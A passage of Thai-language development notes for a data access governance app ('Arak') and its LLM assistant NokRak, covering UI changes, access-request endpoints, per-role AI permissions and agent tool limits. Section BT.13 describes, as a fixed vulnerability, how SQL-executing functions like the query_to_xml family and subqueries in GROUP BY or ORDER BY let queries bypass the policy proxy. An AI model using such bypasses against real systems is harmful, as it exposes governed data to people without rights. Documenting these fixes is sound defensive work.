- ชื่อ "Sakan Punyanon" และ "Peerawan Chaiyasith" (ผู้ใช้ขอเพิ่ม 2026-09-30) ในโค้ดตอนนี้อยู่ที่ Settings → Credits กับ README เท่านั้น (secret scan allowlist ตามนี้)
- ผ่าน: jest `Rail` + `SettingsPage` 20/20 · tsc

### BT.12 Grant ที่หมดไปแล้วตั้งแต่ตอนสร้าง — ไม่รับอีกต่อไป
- เดิม `GrantStore.insert` เช็คแค่ end > start จึงรับ grant ที่ทั้งช่วงอยู่ในอดีตได้ (เช่น 1–29 ส.ค. สร้างวันนี้) ไม่เปิดอะไรให้ใคร แต่ขึ้นใน trail ว่า "ให้สิทธิ์" แล้ว expiry job ก็เขียน EXPIRE ซ้ำอีกบรรทัด
- ตอนนี้ใช้กติกาเดียวกับ amend: end ต้องอยู่ในอนาคต → 400 *"the end is already past; a grant has to end in the future"* · start ย้อนหลังได้ถ้า end ยังไม่ถึง
- `GrantCompositionIT.Rejected.windowMustNotBeOver` ใหม่ · `expiryJobIsNarrow` เปลี่ยนเป็นรัน job ณ เวลาหลัง grant หมด แทนการสร้าง grant ย้อนหลัง
- ผ่าน: IT `GrantCompositionIT` 20/20 · unit grant/stewardship

### BT.10 Catalog บอกว่าตารางต่อ source แล้วหรือยัง และคนดู query ได้ไหม · ตารางที่ไม่ได้ต่อไม่มีปุ่มขอ · คำขอที่ policy กันยังส่งได้
- ผู้ใช้แจ้ง 2 เรื่อง: ตาราง "Metadata only" ยังมีปุ่ม Request access · ใน Catalog ดูไม่ออกว่าตัวเอง query ตารางไหนได้
- เปลี่ยนคำ (ชื่อใน API เดิมทั้งหมด เช่น `querySource`): badge `Queryable · src` → `Connected · src` · `Metadata only` → `Not connected` · filter เป็น Connected / Not connected · คอลัมน์ export `Queryable via` → `Connected through` · หน้า detail มี 2 แถวแยกกัน **Connection** (เรื่องของตาราง) กับ **Your access** (เรื่องของคนดู) · badge ของตารางไม่พูดว่า "you" · badge ของคนขึ้นต้นด้วย "You" เสมอ · Catalog มีบรรทัด legend อธิบายความต่าง
- badge ของคน (TABLE/VIEW เท่านั้น · ตารางที่ Not connected ไม่มี): `You can query` · `You requested access` · `You can request` · `You have no access` (tooltip บอกแค่ชนิดของกฎ ไม่บอกชื่อ policy) · ขึ้นบน card, tree และตาราง Contents · ยังไม่ได้ทำ filter "My access"
- endpoint ใหม่ `POST /v1/access-requests/eligibility` body `{"assetFqns": [...], "purpose": null}` → `[{assetFqn, queryable, readable, requestable, openRequestId, blockedKind}]` ของผู้เรียกเองเท่านั้น · สูงสุด 50 ต่อครั้ง (เกิน หรือไม่มี list → 400) · ตัดค่าว่างและค่าซ้ำ · frontend (`catalog/myAccess.ts`) ถามทีละ 50 ต่อหน้า ไม่ถามทีละแถว
- ตาราง Not connected: eligibility ตอบ `queryable:false, requestable:false` · หน้า detail แสดงป้ายเทาเส้นประ *"Not connected — nothing to query yet"* แทนปุ่ม · `POST /v1/access-requests` ตอบ 409 (FQN ที่ไม่มีอยู่จริงก็ได้ 409 นี้)
- ปิดชื่อ policy: เพิ่ม `blockedKind` = `DENIED` / `NOT_ADMITTED` · `blockedBy` / `blockedByPolicy` / `blockedByPolicyId` / `blockedByReason` ส่งให้เฉพาะคนที่ `Stewardship.oversees` (admin, POLICY_AUTHOR, DATA_OWNER ใน scope, AUDITOR) หรือ approver แบบ user · requester ธรรมดาได้แค่ `blockedKind` · ใช้ที่ `GET /v1/access-requests/eligibility/{fqn}` และ 403 ของ `POST /v1/query` ผ่าน `AccessEligibility.toldTo` · batch ไม่ส่งชื่อ policy ให้ใครเลย
- ผู้ใช้สั่ง 2026-09-27 (*"User ยังต้องสามารถกรอกขอได้สิ"*): คำขอที่ policy กันยังส่งได้ → 201 · 409 เหลือแค่ Not connected กับ "อ่านได้อยู่แล้ว" · ฟอร์มกด Send ได้ · requester เห็น *"A policy may also need to change before this can be granted. Your request still goes to the owner, who will see what else is needed, so it may take longer."* · owner/admin เห็น *"Approving would not let you in: [policy] still refuses ([เหตุผล]). Change that policy to give access."* ชื่อ policy ลิงก์ไป `/policies/:id` (DENIED ใช้เหตุผล *you are among the people it shuts out*) · หน้า Review ยังเหมือนเดิม
- New request หลายตาราง: ตารางที่ policy กันถูกส่งไปด้วย · ตาราง Not connected ถูกตัดออกพร้อมบอกเหตุผล
- endpoint ที่ shape เปลี่ยน: `GET /v1/access-requests/eligibility/{fqn}` (field ใหม่ + ปิดชื่อ policy) · 403 ของ `POST /v1/query` (เหมือนกัน) · `POST /v1/access-requests/eligibility` (ใหม่) · `POST /v1/access-requests` (policy กัน → 201 · Not connected → 409)
- NokRak (`AssistToolbox`) ไม่เสนอตารางที่ policy กันหรือที่ไม่ได้ต่อ
- ผ่าน: unit `AccessRequestResourceTest` 14 · `AssistToolboxTest` 15 · `AccessEligibilityTest` 4 · IT `AccessRequestIT` 91/91 + `CatalogQueryIT` 22/22 · jest ทั้งหมด 63 suites / 628 · tsc · eslint ไฟล์ที่แก้

### BT.14 ผู้ขอสิทธิ์ไม่เห็นว่า policy ไหนขวางอยู่ · แถวข้อมูลของตารางเหลือบรรทัดเดียว
- ผู้ใช้บอกว่าข้อความ "Approving would not let you in: <policy> still refuses…" ในฟอร์มขอสิทธิ์ทำให้ผู้ขอสับสน → เอาออกจากฝั่งผู้ขอทั้ง 3 ที่: ฟอร์ม Request access (`BlockedNote` ถูกลบ), หน้าขอหลายตาราง (แถวที่ติด policy ขึ้นแค่ "Will be requested" เหมือนตัวอื่น), badge "You have no access" ใน Catalog (tooltip บอกแค่ว่ายังขอได้)
- คนตัดสินยังเห็นเหมือนเดิมตอน review คำขอ (`RequestReview`: "Refused — <policy>") · server ยังส่ง `blockedBy…` มาเหมือนเดิม แค่ฟอร์มไม่แสดง
- หน้า table: แถว facts เดิม flex-wrap แล้ว Connection / Your access มีประโยคอธิบายยาว → ตกเป็นสองบรรทัดและบรรทัดที่สองขึ้นต้นด้วยเส้นคั่น · แก้: facts เหลือแต่ badge (คำอธิบายอยู่ใน tooltip), "Your access" ย้ายไปอยู่ข้างปุ่ม Request access, เส้นคั่นอยู่หน้าทุกช่องแล้ว strip ถูกเลื่อนซ้าย 33px + `overflow-x-clip` → แถวที่ wrap ไม่ขึ้นต้นด้วยเส้น · `reachSentence` และ `Standing.sentence` ถูกลบ
- ผ่าน: jest 626/626 · ดูบน local ที่กว้าง 1540 (บรรทัดเดียว) และ 900 (wrap ไม่มีเส้นนำหน้า)

### BT.13 Query proxy: function ที่รัน SQL เอง และตารางที่อ่านซ้ำจากตำแหน่งที่ไม่ถูก rewrite
- ช่องโหว่ 1: statement ไปรันที่ source ในนาม credential ของ source · function บางตัวของ PostgreSQL รับข้อความ SQL แล้วรันเอง (เช่นตระกูล `query_to_xml`) proxy มองไม่เห็นตารางในข้อความนั้น → อ่านได้ทุกอย่างที่ account ของ source อ่านได้ ไม่ผ่าน policy · ยืนยันบน local ด้วย `select 1` ข้างใน
- แก้: `ProxyFunctions` = allow-list ต่อ engine (aggregate, window, text, number, date, JSON, cast ของ MSSQL) · ชื่อที่ไม่อยู่ในรายการ, ชื่อที่มี schema นำหน้า, `{fn ...}`, sequence, session variable → 403 พร้อมบอกชื่อ function · `SELECT ... INTO` กับ `FOR UPDATE/SHARE` → 403 · engine ที่ยังไม่มีรายการได้แค่ชุดกลาง
- parser (JSqlParser 4.9) ไม่สร้าง node ให้ function ที่เป็น argument เดียวของอีก function (`sum(lower(x))`) จึงไล่ argument ของทุก call ซ้ำด้วย `ExpressionVisitorAdapter` (`CallScreen`)
- ช่องโหว่ 2: gate ที่สองเทียบตารางด้วยชื่อ และมองแค่ clause ที่ `TablesNamesFinder` เดินถึง (ไม่มี GROUP BY / ORDER BY) → อ่านตารางที่คุมอยู่ซ้ำจาก subquery ข้างๆ ได้โดยไม่ถูก rewrite · แก้: เดิน JJTree ทั้งต้น ทุก `TableName` ต้องเป็น reference ที่ walk แทนที่แล้ว (เทียบ identity) หรือเป็น qualifier ของ `t.*`
- SQL Server: parse ด้วย `withSquareBracketQuotation` แล้ว เดิมรูป enforced (`[schema].[table]`) parse กลับไม่ได้ ทุก query ไป MSSQL ผ่าน proxy จึงไม่รัน
- ผู้ใช้ถามว่า "user ก็ query ได้ไม่หมดสิ": function ที่คนใช้จริงอยู่ในรายการแล้ว · ถ้าต้องการเพิ่มตัวไหน ใส่ใน `ProxyFunctions` (เฉพาะตัวที่คำนวณจากค่าที่ส่งเข้าไปเท่านั้น) · ยังไม่ได้ทำให้ admin ตั้งเพิ่มต่อ source ได้
- ยังแนะนำ: ให้ source ใช้ role ที่อ่านได้แค่ schema ที่ governed (role เป็น cluster-wide บน server ที่แชร์ ต้องถามก่อนสร้าง)
- ผ่าน: unit proxy 47/47 (`QueryRewriterTest` 33 · `ProxyCapabilitiesTest` 14) · IT `QueryLogIT` 10/10 · local probe · prod `prod-queries.mjs` 31/31 (Q16 built-in ปกติรันได้ · Q32–Q35 ถูกปฏิเสธ · count 164 ก่อน/หลังเท่ากัน)
- หมายเหตุ demo: `S12-schema-allow-demo-tenant` เป็น DENY (displayName ถูก แต่ชื่อภายในยังมีคำว่า allow จากเวอร์ชันแรก) คนที่ไม่มี `tenant=ARAK-DEMO` รวมถึง admin จึงโดนกัน · ถูกต้องตามที่ตั้งใจ

### BT.6 ค้าง
- credential ของ source บน prod ที่ auth ไม่ผ่าน ผู้ใช้เป็นคนตัดสิน · แก้แล้วให้รัน Q1–Q7 ใน `prod-demo-policies.mjs` อีกรอบ
- กรณี group บน prod รอ push แล้ว deploy V35 ก่อน

## รอบก่อนหน้า — **ข้อ BS: ปุ่ม NokRak บนหน้า New policy และ Query · Query console จัดใหม่แบบ BigQuery · Policy draft ที่ได้ selector ว่าง**

ผู้ใช้ขอ *"ในหน้า New policy ให้มีปุ่ม NokRakช่วยด้วย"* · *"ตรง Query ก็มีปุ่ม NokRakเขียนให้หน่อย"* · *"เชื่อมกับ Engine AI เดิมที่เคยมีไว้"* · *"การจัดวางปุ่ในหน้า Query ยังไม่ดีพอ ไม่ดีเท่า bigquery"* · *"หน้า Policy นี่แก้ยังนะ"*

### BS.1 ชิ้นส่วนกลาง — `assist/NokRakAsk.tsx`
- `NokRakButton` — ปุ่ม secondary หน้าน้องรักษ์ · `aria-expanded`
- `NokRakPrompt` — ประโยคเดียวเข้า draft ออก · Enter = ถาม · Shift+Enter = ขึ้นบรรทัด · **Esc = ปิด** · `disabled` (ยังถามไม่ได้ -> hint บอกเหตุผล ไม่ขึ้น alert แดง) · `floating` (ลอยทับหน้า ไม่ดันอะไรลง)
- ใช้ engine เดิมทั้งหมด: `/v1/llm/assist/sql` และ `/v1/llm/assist/policy` · แสดงเฉพาะ role ที่มีงาน `WRITE_SQL` / `DRAFT_POLICY` (`useAssistReady` — สิทธิ์ต่องานของ AI จาก M28 บังคับที่ server)

### BS.2 New policy — ปุ่ม "NokRak, help me"
- อยู่ข้าง Create draft (เฉพาะหน้า new) · พิมพ์กฎเป็นภาษาคน -> `assistPolicy` -> `loadDrafted` เติม form
- **ตัด `id` / `lifecycleState` ทิ้งเสมอ** · ไม่ save · ไม่ activate — ต้องกด Create draft เอง · note บอกให้อ่านทุก step
- คำตอบที่ไม่ใช่ policy document -> ไม่โหลดอะไร บอกให้ลองพูดใหม่ · dock ใช้ `loadDrafted` ตัวเดียวกัน
- **บั๊กที่ผู้ใช้เจอ: form ได้ selector/operator ว่าง** — prompt ของ `/policy` ส่ง schema แค่ `policy.json` / `subjectRule.json` / `dataPolicy.json` แต่ `assetSelector` กับ `facetOperator` อยู่ใน **`type/facet.json`** -> model เดารูปเอง (`"selector":{"tags":["PII"]}`, `"subject":{"expression":...}`) · แก้ `LlmAssistResource.POLICY_SCHEMAS` ให้ส่ง `type/facet.json` ด้วย (header `// <path>` ต่อไฟล์) · test `LlmAssistResourceTest$PolicyDraft`
- ยืนยันกับ gpt-5 จริง: ได้ `selector.condition {facet, operator}` · `subject.attributes` · `data.columnRules` ครบ แล้ว form แสดงทุก step

### BS.3 Query — ปุ่ม "NokRak, write it" + จัดหน้าใหม่แบบ BigQuery (`QueryPage.tsx` · `QueryAssist.tsx`)
- `WriteWithNokRak` — คำถาม + source + dialect -> SQL แสดงก่อน · **Use this = ใส่ editor เท่านั้น ไม่ run** · run ผ่าน proxy เหมือนพิมพ์เอง · ยังไม่เลือก source -> ปุ่ม Write disabled + hint (ไม่ขึ้น alert แดงก่อนถามอะไร)
- layout ใหม่ (เดิม toolbar wrap 2 แถว · panel NokRak + Explanation ดัน editor ลง):
  - **แถวบริบท**: Source · Run as · บรรทัดเดียว "Running as yourself…" (ข้อความเต็มอยู่ใน `title`) · ปุ่ม Exit full screen ตอน full screen
  - **แถบของ editor แถวเดียวไม่ wrap**: Run · NokRak, write it · Explain · | · **Query settings** (`200 rows · No purpose` -> popover react-aria มี Row limit + Purpose) · Ctrl/⌘+Enter ขวาสุด
  - panel NokRak **ลอยทับ editor** (`absolute`, กว้างสุด 40rem) — ไม่ดัน editor
  - "What this statement does" ไป **อยู่ข้าง editor** สูงเท่า editor scroll ในตัว
  - ช่อง "Results appear here" ยืดเต็มที่เหลือ (เดิม shrink-0 เหลือที่ว่างครึ่งจอ)
- test: `QueryAssist.test` NokRak 5 (Use this · problem · ไม่มี source = disabled ไม่มี alert · ปิดด้วยปุ่ม · Esc)

### BS.4 ทดสอบ
- `tsc` สะอาด · jest เต็ม **56 suites / 564 tests ผ่าน** · build ผ่าน · backend `LlmAssist*` 27 ผ่าน
- Playwright จริงที่ :8090/Arak (1440px, gpt-5): New policy -> draft เติม form ครบ · Query -> toolbar แถวเดียว · settings popover · NokRak เขียน SQL ของ `procurement.po` -> Use this -> Explain ข้าง editor · 0 response 5xx / page error

### BS.5 ไม่เปลี่ยน / ไม่มี
- **ไม่มี migration · ไม่มี env ใหม่** · ไม่มี endpoint ใหม่
- ปุ่ม NokRak ไม่ run SQL · ไม่ save / activate policy เอง
- ข้อสังเกตที่ยังเป็นแบบเดิม (ตามดีไซน์ที่บันทึกไว้): prompt ของ `/sql` และ `/policy` ใช้ metadata ของ catalog ที่ไม่ได้กรองตามสิทธิ์ (metadata ไม่ถือเป็นความลับ) — ต่างจาก agent M28 ที่กรองก่อน

## รอบก่อนหน้า — **ข้อ BR: Workflow Builder แบบ OpenMetadata · Policy มี Diagram ทั้งตอนสร้างและตอนอ่าน · หน้า Policy จัดใหม่ให้สะอาด**

ผู้ใช้ขอ *"อันนี้ตัวอย่าง Workflow Builder ของ Openmetadata อยากให้มาทำฝั่ง Arak ในการกำหนด Workflow Access Request บ้าง"* · *"อยากให้ UI นี้ใช้กับ Diagram ของ Policies นอกจาก text, workflow เพิ่ม Diagram ด้วยทั้งตอนสร้าง และ Display"* · *"ปรับหน้า Policy อันนี้ให้ดู Clean ใช้งานง่าย และดูไม่รกตา"*

### BR.1 ชิ้นส่วนกลาง — `components/diagram/FlowDiagram.tsx` + `components/TabStrip.tsx`
- canvas จุดแบบ OM · node เป็น HTML (เลือกข้อความได้ · focus ได้ · อ่านตามลำดับ flow) · ไม่ใช้ graph library (เหตุผลเดียวกับ `PolicyFlowChart`)
- ผู้เรียกวาง node บน grid (column = ไกลแค่ไหนใน flow · row = อะไรวิ่งข้างกัน) · edge `across` ออกจุดขวา · edge `down` ออกจุดล่างแล้วเลี้ยวขวาตาม lane ล่าง = ทางของทุก "No" ไม่ตัดผ่าน node
- node เป็นปุ่มเฉพาะเมื่อส่ง `onSelect` · `selectable: false` ให้เป็น text เสมอ
- **zoom พอดีกว้างเอง** (`fitZoom`) — scale ต่อเนื่อง ≤ 100% ไม่ต่ำกว่า 50% (ต่ำกว่านั้นให้ scroll) · ผู้ใช้กด zoom แล้วไม่ fit ทับอีก · clientWidth = 0 (jsdom / tab ซ่อน) = 100%
- `TabStrip` = role tablist/tab + count pill · ใช้ทั้ง Workflow Builder และหน้า Policy

### BR.2 Workflow Builder — `/settings/workflows/:id` (`WorkflowBuilderPage` · `workflowParts` · `workflowDiagram`)
- หน้า list `/settings/workflows` เหลือแค่ตาราง → กดเข้าไปเป็น builder เต็มหน้า: diagram ซ้าย · แผงแก้ stage ที่เลือกขวา · tab Executions
- **Executions** `GET /v1/access-workflows/{id}/requests` และ `/built-in/requests` (`WorkflowStore.executions`) — คำขอที่ workflow นี้ตัดสิน · เลข ticket · สถานะ · **ไม่มี requester_ip ในคำตอบ** (IT assert แล้ว) · สิทธิ์เดียวกับอ่าน workflow
- test: `AccessWorkflowResourceTest` + `AccessRequestIT` (executions) · `WorkflowBuilderPage.test` 13 · `AccessWorkflowsPage.test` 13

### BR.3 Policy Diagram — `pages/policies/PolicyDiagram.tsx`
- อ่าน `buildFlow(policy)` ตัวเดียวกับ Text / Flowchart → ไม่มีทางวาดคนละเรื่องกับที่ engine ทำ
- Read requested → Which assets (check) → Who (check) → What happens → ทางออก · ทุก gate ที่มีทางออกมี "No" เส้นประลงไปที่ node เดียว **"Policy does not apply"** · gate ที่ใครก็ผ่าน (subject ว่าง) เป็นสีเตือนและไม่มี No · DENY เป็นสีแดง + "Nothing is read"
- ใต้ canvas: การ์ด "If not · …" ต่อ gate + note ของ gate
- **ตอนสร้าง** (Policy builder มุม Form / Flowchart / **Diagram**) — กด node → กลับไป Form แล้ว scroll ไปที่ step ที่เขียนมัน · มุม Diagram ใช้เต็มกว้าง rail ย้ายลงล่าง
- **ตอนอ่าน** (หน้า `/policies/:id` มุม Text / Flowchart / **Diagram**) — ไม่มีปุ่มใน node (อ่านอย่างเดียว · แก้ต้องกด Edit)
- test: `PolicyDiagram.test` 5 · Builder +1 · Detail +2

### BR.4 หน้า Policy จัดใหม่ (`PolicyDetailPage.tsx`)
- header card: icon ตามชนิด (data = ตาสีม่วง · subscription = กุญแจ) · ชื่อ · state · ชื่อ mono · description · ปุ่ม Activate/Disable + Edit
- แถบ facts 4 ช่อง: Kind · Applies at · Effect/Environment · Version + วันที่ (รูปแบบ medium ตาม locale)
- ส่วนที่เหลือเป็น tab: **Overview · Applies to (นับ table) · Impact (นับคน) · Other policies (นับ)** · tab อยู่ใน URL `?tab=` ลิงก์ตรงได้ · alert "โดน DENY ทับ" ยังอยู่นอก tab เสมอ
- Overview = การอ่าน policy + Configuration + History (Diagram เปิด → ใช้เต็มกว้าง แผงข้างลงไปอยู่ล่าง 2 คอลัมน์)
- ตัด panel "Why it exists" (ซ้ำกับ description) และลิงก์ "Open in the builder" (ซ้ำกับ Edit)
- Policy builder: back link · header card แบบเดียวกัน · แถบ view toggle เหนือเนื้อหา

### BR.5 ทดสอบ
- `tsc` สะอาด · jest เต็ม **56 suites / 555 tests ผ่าน** · build ผ่าน
- Playwright จริงที่ :8090/Arak — list / detail (text · diagram · applies to · impact) / builder (form · diagram) · 0 response 5xx / page error · diagram fit 67% ที่ 1440px ไม่ตกขอบ

### BR.6 ไม่เปลี่ยน / ไม่มี
- **ไม่มี migration · ไม่มี env ใหม่** · backend เพิ่มแค่ endpoint อ่าน executions
- diagram อ่านอย่างเดียวบนหน้า policy — ไม่มีทาง activate / แก้จาก diagram

## รอบก่อนหน้า — **ข้อ BQ: Add new connection แบบ OpenMetadata · Table scope ตอน import · import กับ OM crawl เป็น object เดียวกัน**

ผู้ใช้ขอ *"หน้า add new connection อยากให้ทำสวยๆ เหมือนของ openmetdata"* · *"สามารถ Scope ได้ด้วย"* · *"อย่าลืมว่าต้องสามารถไป deploy ได้นะ"* · และถามว่า *"ตอน Sync มาที่ Arak Table จะตรงกัน … เป็น Object เดียวกัน"*

### BQ.1 Migration — **V32 `data_source.table_scope`**
- `jsonb` nullable · null = scan ทุกตารางเหมือนเดิม → source เก่าไม่เปลี่ยนพฤติกรรม
- **deploy:** Flyway รันเองตอน start · **ไม่มี env ใหม่** · ไม่แตะ customer DB

### BQ.2 Table scope (`TableScope.java` + `pages/sources/tableScope.ts`)
- `mode` = `ALL` (scan all) / `ONLY` (เฉพาะที่ระบุ) · `include[]` / `exclude[]` · rule = `STARTS_WITH` / `ENDS_WITH` / `CONTAINS` / `EQUALS` + text
- **เทียบ text ธรรมดา ไม่ใช่ regex / LIKE** · ไม่สนตัวพิมพ์ · text มีจุด = เทียบ `schema.table` · exclude ชนะ include · ≤ 50 rule ต่อฝั่ง · ≤ 256 ตัว · ห้ามขึ้นบรรทัด
- `ONLY` ที่ไม่มี include = server ปฏิเสธ (กัน source ที่ import ไม่ได้อะไรเลยแบบเงียบๆ)
- **scope มีผลกับการ import เท่านั้น — ไม่ใช่สิทธิ์** · ตารางที่อยู่นอก scope ยังถูก policy คุมตามปกติถ้า OM crawl มา
- `POST /v1/sources/scope-preview` = ลอง scope กับ login จริงก่อนบันทึก (บอก Read / Left out) · import รายงาน `excluded` + `outOfScope`
- ฝั่ง frontend เป็นสำเนาไว้ preview เท่านั้น — กติกาเดียวกับ `TableScopeTest` (import ใช้ของ server)

### BQ.3 Wizard (`pages/sources/ConnectionWizard.tsx` · `Notice.tsx` · `ImportReport.tsx`)
- stepper 3 ขั้น: **Select service → Connect → Scope & finish** แบบ OM · card Name / Connection / Authentication / Scope & Options / Advanced · แถบ **Test connection** ล่าง
- badge ต่อ card (*1 required* / *Complete* / *Given*) · Register กดได้เมื่อครบ name + host + credential · ช่อง password มีปุ่มตา
- แก้ source เดิม = เปิดที่ขั้น Connect · credential เดิมขึ้นเป็น *Stored* (ส่ง `fernet:stored` — server เก็บของเดิม) · ไม่เคยส่ง secret กลับมาที่ browser
- หลัง Register มีปุ่ม **Import tables now** + รายงานผล · หน้า Sources มีปุ่ม Import tables ต่อ card + บรรทัด *Tables* บอก scope เป็นประโยค

### BQ.4 Import กับ OM crawl = **asset เดียวกัน** (`SourceCatalogImporter`)
- ปัญหาที่เจอตอนรันจริง: import ตั้งชื่อ asset ด้วย **ชื่อ source ใน ARAK** แต่ OM ตั้งด้วย **ชื่อ service ใน OM** → ตารางเดียวกันกลายเป็น 2 asset และ import รอบสองจอง physical table ไม่ได้ (`asset_fqn_map` unique ต่อ physical)
- แก้: `serviceOf(source)` = `omServiceFqn` ถ้าตั้งไว้ ไม่งั้นใช้ชื่อ source · ตาราง OM crawl มาแล้ว → import แค่ยืนยัน (MATCHED) ไม่สร้างซ้ำ ไม่ทับ description / tag / owner ของ OM
- `map()` ปล่อย physical tuple จาก FQN เก่าก่อน upsert · `retireSuperseded()` retire asset `discovered` ของ source นี้ที่อยู่นอกชื่อ service ใหม่ (table → column → schema → database → service ที่ไม่มีลูกเหลือ) · asset ของ OM / local ไม่ถูกแตะ
- วิธีผูก: หน้า Sources → แก้ source → Advanced → **OpenMetadata service** = ชื่อ service ใน OM (hint บอกแล้วว่า import จะใช้ชื่อนี้)
- ⚠️ tag จาก OM ที่เป็น `Suggested` **ไม่ถูก enforce** ตาม FR-1.3a จนกว่าจะ Confirm ใน OM

### BQ.5 ผลทดสอบ
- Backend unit: `TableScopeTest` · `SourceResourceScopeTest` · IT: `SourceCatalogImporterIT` 7 (รวม *aLinkedSourceImportsUnderTheServiceName* · *linkingLaterMovesTheImport* · *theCrawledTableIsTheSameAsset*) · `DataSourceStoreIT`
- Frontend: `tableScope.test.ts` 13 · `ConnectionWizard.test.tsx` 9 · `SourcesPage.test.tsx` 4 · **jest ทั้งหมด 53 suites / 531 tests ผ่าน** · tsc + build ผ่าน
- รันจริงบน dev (`:8090/Arak/`): ผูก source ของ PG จริงกับ service ใน OM → sync → import รายงาน `newTables: 0` · catalog เหลือ asset ปัจจุบันตัวเดียว (provenance openmetadata · ผูก source · `MATCHED`) · asset ชื่อเก่า retire แล้ว

## รอบก่อนหน้า — **ข้อ BP: M28 Conversational ARAK Agent — น้องรักษ์คุยได้ · ค้น Catalog ด้วย LLM · สิทธิ์แต่ละงานของ AI ตั้งต่อ role ใน Settings**

ผู้ใช้ขอ *"Catalog ต้องสามารถแชทพูดคุยได้สิ หรือ ด้านขวาล่าง Mascot ต้องแชทคุยได้ อยากทำอะไร หาอะไร เปิดหน้าไหนในแอพ"* · *"หรือทำเป็น Agent ไปเลย"* · *"Catalog ต้องสามารถให้ LLM มาช่วยในการค้นหาได้ด้วย"*

### BP.1 Migration — **V29 `llm_feature_access`**
- `(feature PK, roles text[], updated_at, updated_by)` · ไม่มีแถว = เปิดให้ทุกคน (`EVERYONE`) เหมือนก่อน M28
- **deploy:** main มี V30/V31 อยู่แล้ว → V29 เข้าทีหลัง · `DacApplication` เปิด `outOfOrder(true)` ไว้ตั้งแต่ BN → Flyway รัน V29 เองตอน start ไม่ต้องทำอะไรเพิ่ม · **ไม่มี env ใหม่**
- ⚠️ dev DB รัน V29 ไปแล้ว — ห้ามแก้เนื้อหา V29 (checksum)

### BP.2 สิทธิ์ต่องาน (`LlmFeatureStore`)
- งาน: `CHAT` · `WRITE_SQL` · `FIX_SQL` · `EXPLAIN_SQL` · `DRAFT_POLICY` · `CATALOG_SEARCH` · `INSIGHTS`
- role: `PLATFORM_ADMIN` · `POLICY_AUTHOR` · `DATA_OWNER` · `AUDITOR` · `REQUESTER` · หรือ `EVERYONE`
- **แคบลงอย่างเดียว** — ยังต้องเปิด assistant + gateway ตอบได้ · ติ๊ก role ไม่ได้ให้สิทธิ์ข้อมูลอะไรเพิ่ม
- บังคับที่ server ทุก endpoint (`/assist/sql` `/fix` `/explain` `/policy` `/chat`) → 403 *"… is not offered to your role"* · ซ่อนปุ่มฝั่ง UI เป็นแค่มารยาท
- `GET /v1/llm/assist/features` = งานที่ตัวเองได้ · `GET/PUT /v1/llm/features[/{feature}]` = PLATFORM_ADMIN เท่านั้น

### BP.3 Agent (`ArakAgent` + `AgentPrompts` + `AssistToolbox`)
- `POST /v1/llm/assist/chat` `{message, history, path, sourceId, assetFqn}` → `{text, cards, toolsUsed, model, personal}`
- tool-calling loop กับ gateway (OpenAI-compatible `tools`) · model ได้เฉพาะ tool ของงานที่ role นั้นได้:
  - `search_catalog` / `describe_asset` (CATALOG_SEARCH) — **กรองตามสิทธิ์ก่อนถึง model** · แต่ละตารางบอก `READABLE` / `REQUESTABLE`
  - `write_sql` (WRITE_SQL) — ต้องผ่าน read-only check เดียวกับ M11 · เป็น card ให้กด *Put it in the editor* **ไม่รัน**
  - `draft_policy` (DRAFT_POLICY) — เป็น DRAFT เสมอ
  - `query_log` / `dashboard` (INSIGHTS) — scope เดียวกับหน้า Query log / Dashboard · **ไม่มี client_ip** · literal + reject reason ถูก redact
  - `navigate` — route เฉพาะหน้าในแอป (allow-list) · ไม่มี URL ภายนอก
- ทุก tool รันด้วยสิทธิ์ของคนที่คุย · IP ของ request ใช้ตัดสินใจเท่านั้น ไม่เคยส่งให้ model
- ข้อความ ≤ 4000 ตัว · history ≤ 16 · history รับเฉพาะ role user/assistant (กัน client ยัด system/tool)
- prompt สั่ง **plain text ไม่มี Markdown** และไม่ต้องไล่ชื่อตารางซ้ำกับ card (เจอตอนรันจริง: model ตอบ `**…**` + ไล่ชื่อตารางซ้ำ) · ฝั่ง UI มี `plainText()` ลอก `**` / backtick / `#` ออกอีกชั้น

### BP.4 Frontend
- `assist/AssistChat.tsx` — แชทใน panel น้องรักษ์ · ส่ง path + FQN ของหน้าที่เปิดอยู่ · ข้อความ model แสดงเป็น **text เท่านั้น** (ไม่มี `dangerouslySetInnerHTML`) · `safeRoute()` รับเฉพาะ `/…` ไม่รับ `//` หรือ `\`
  - card: sql → *Put it in the editor* (ส่ง SQL + source ไปหน้า Query ไม่รัน) · policy → *Load into the builder* · asset → ลิงก์ + ป้าย *You can query it* / *Request access* · link → หน้าในแอป
- `assist/AssistDock.tsx` — panel มีแท็บ *Chat* กับงานของหน้า (*Write a query* / *Draft a policy*) แสดงเฉพาะที่ role ได้
- `assist/AskArak.tsx` — ปุ่ม **Ask NokRak** ข้างปุ่ม Search ในหน้า Catalog · ค้นไม่เจอ → *"Nothing is called that. Asking by what the table holds may find it."* + ปุ่ม · global search ด้านบนมี *Ask NokRak to find "…"* บนสุดของ dropdown · ต้องได้ทั้ง `CHAT` และ `CATALOG_SEARCH`
- `assist/useAssist.ts` — `useAssistReady(feature)` / `useOfferedFeatures()` (ย้ายมาจาก QueryAssist) · Explain / Fix ในหน้า Query ใช้ gate ต่องานแล้ว
- Settings → Assistant → การ์ด **Who gets which job** (admin) — ตาราง งาน × Everyone + 5 role · เอา Everyone ออก = ติ๊กทุก role แทน (ไม่ใช่ปิดทุกคนในคลิกเดียว)

### BP.5 ผลทดสอบ
- Backend unit: `AgentPromptsTest` 10 · `ArakAgentTest` 10 · `LlmFeatureStoreTest` 5 · `AssistToolboxTest` 15 · `LlmAssistChatTest` 10 · IT: `LlmFeatureStoreIT` 4
- Frontend: `AssistChat.test.tsx` 13 · `AssistDock.test.tsx` 6 · `AskArak.test.tsx` 5 · `LlmFeatureAccess.test.tsx` 7 · **jest ทั้งหมด 50 suites / 505 tests ผ่าน** · backend unit suite ทั้งชุดผ่าน · tsc + build ผ่าน
- รันจริง (Playwright บน `:8090/Arak/` + gateway จริง): Catalog พิมพ์ *phone numbers* → Ask NokRak → ได้ 6 ตารางเป็น card แยก query ได้ / ต้องขอ · global search มีปุ่ม Ask · หน้า Settings มีตาราง Who gets which job

## รอบก่อนหน้า — **ข้อ BO: Preauthorization — ขอล่วงหน้าให้กลุ่มคน ตาม tag/domain ของตารางใต้ scope**

ผู้ใช้ขอไว้ใน roadmap (Preauthorization) → ทำต่อจาก BN · คำขอชนิดที่สอง: ไม่ได้ขอตารางเดียวให้ตัวเอง แต่ขอ **ล่วงหน้า** ให้ **กลุ่ม / ทีม / คนที่มี attribute** สำหรับ **ทุกตารางใต้ scope ที่มี tag / classification / glossary term / domain ตามที่ระบุ** — รวมถึงตารางที่จะถูกติด tag แบบเดียวกันในอนาคต
